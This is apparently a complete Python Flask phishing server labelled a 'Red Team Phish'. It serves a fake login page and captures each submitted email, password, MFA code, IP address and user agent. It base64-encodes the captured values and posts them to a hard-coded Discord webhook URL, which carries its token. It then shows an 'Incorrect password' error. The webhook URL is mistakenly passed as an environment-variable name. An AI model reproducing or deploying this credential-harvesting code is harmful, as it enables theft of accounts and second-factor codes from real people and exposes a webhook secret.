from flask import Flask, request, render_template
import requests, os, base64, datetime

app = Flask(__name__)

WEBHOOK_URL = os.environ.get("https://discord.com/api/webhooks/1387163346603872316/_7Xw4z5H82fj5Xl2NFoG8WHFnxsmEE4Sd8rFvpxmg1DuDF4tnL1g3-0cpADXAyL4YzxL")

def send_to_webhook(data: dict):
    now = datetime.datetime.utcnow().isoformat()
    content = f"""
**📥 Red Team Phish Triggered**
🕒 {now} UTC

📧 **Email**: {data.get('email')}
🔐 **Password**: {data.get('password')}
📲 **MFA**: {data.get('mfa')}
🌐 **IP**: {data.get('ip')}
🖥️ **User-Agent**: {data.get('ua')}
"""
    encoded = base64.b64encode(content.encode()).decode()
    payload = {"content": f"```
{encoded}
```"}
    headers = {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}

    try:
        requests.post(WEBHOOK_URL, json=payload, headers=headers, timeout=5)
    except Exception as e:
        print("Webhook failed:", e)

@app.route("/", methods=["GET"])
def index():
    return render_template("login.html")

@app.route("/login", methods=["POST"])
def login():
    email = request.form.get("email")
    password = request.form.get("password")
    mfa = request.form.get("mfa", "")
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    ua = request.headers.get("User-Agent")
    send_to_webhook({"email": email, "password": password, "mfa": mfa, "ip": ip, "ua": ua})
    return render_template("login.html", error="Incorrect password")

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
